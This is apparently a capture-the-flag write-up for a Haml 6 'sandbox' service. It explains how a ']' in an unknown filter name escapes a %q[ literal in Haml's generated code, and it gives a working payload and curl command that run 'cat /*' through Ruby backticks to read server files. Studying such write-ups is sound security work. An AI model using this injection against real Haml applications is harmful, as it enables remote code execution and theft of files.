# Haml Sandbox

## The service

`POST /render` takes a `template` parameter, rejects it if it contains any of a
blocklist of tokens, and otherwise compiles and renders it as Haml 6:

```ruby
FORBIDDEN = ["=", "-", "~", "%", "\#{", "{", "[", ":ruby", ":erb"].freeze

lowertext = template.downcase
blocked = FORBIDDEN.find { |token| lowertext.include?(token) }
halt 400, "blocked token: '#{blocked}'\n" if blocked

Haml::Template.new { template }.render
```

The blocklist covers Haml's script indicators (`=`, `-`, `~`), tag syntax (`%`),
interpolation (`#{`), both attribute syntaxes (`{`, `[`) and the two filters
that evaluate Ruby (`:ruby`, `:erb`). It matches against the lowercased
template, so case tricks do not help, and it runs after `.to_s`, so sending
`template[]=` or `template[a]=` smuggles nothing past it either -- the
stringified Array or Hash contains `[` or `{`.

That leaves plain text, the `.class` / `#id` div shorthand, `/` comments, `!!!`
doctypes, `\` escapes, and the filters that do not evaluate Ruby. None of them
run code. The way in is not a Haml *feature* -- it is the code Haml generates
when a filter name is wrong.

## The bug

Haml 6 does not raise on an unknown filter name while parsing. It compiles the
error *into* the template, as a raise statement carrying the offending name:

```
$ ruby -rhaml -e 'puts Haml::Engine.new.call(":nope")'
_buf = ''.dup;
; raise Haml::SyntaxError.new(%q[Invalid filter name ":nope".], 1); _buf
```

The name is interpolated into that literal unescaped, and `%q[...]` is
**bracket-delimited**. The blocklist rejects `[`, but it says nothing about `]`,
and a `]` closes the literal early -- everything after it is compiled as Ruby.

`:]+X)#` compiles to:

```ruby
raise Haml::SyntaxError.new(%q[Invalid filter name ":]+x)#".], 1); _buf
```

which is `%q[Invalid filter name ":]` followed by `+ x`, a `)` closing the
`.new(` call, and a `#` commenting out the rest of the generated line. Sending
it back confirms the injection -- the reply is
`NameError: undefined local variable or method 'x'`, so `x` was evaluated as
Ruby, and it is lowercase because the parser calls `.downcase` on the filter
name.

Backticks are not on the blocklist either, so swapping `x` for a command
substitution turns the error message into the command's output:

```ruby
raise Haml::SyntaxError.new(%q[Invalid filter name ":] + `cat /*`)#".], 1)
```

The app catches `StandardError` and echoes `"#{e.class}: #{e.message}"`, so the
output comes straight back in the 500 response. `cat /*` reads every file in
`/`; the directories fail to stderr, which backticks discard.

## Solving it

```
curl --data-urlencode 'template=:]+`cat /*`)#' <URL>/render
Haml::SyntaxError: Invalid filter name ":ECSC{...}
```

`solve.py` sends the same request and pulls the flag out of the response:

```
docker build -t haml-sandbox-solve solution/
docker run --rm --network host haml-sandbox-solve 127.0.0.1 31337
docker run --rm haml-sandbox-solve https://<session>.challenge.ecsc2026.de/
```

Note that the payload never needs a character the blocklist covers: `]`, `+`,
`` ` ``, `)` and `#` are all allowed, and `#` is only rejected when followed by
`{`. A flag checker should not assume this exact payload -- any `]` that closes
the `%q[` literal works, and the command is free.
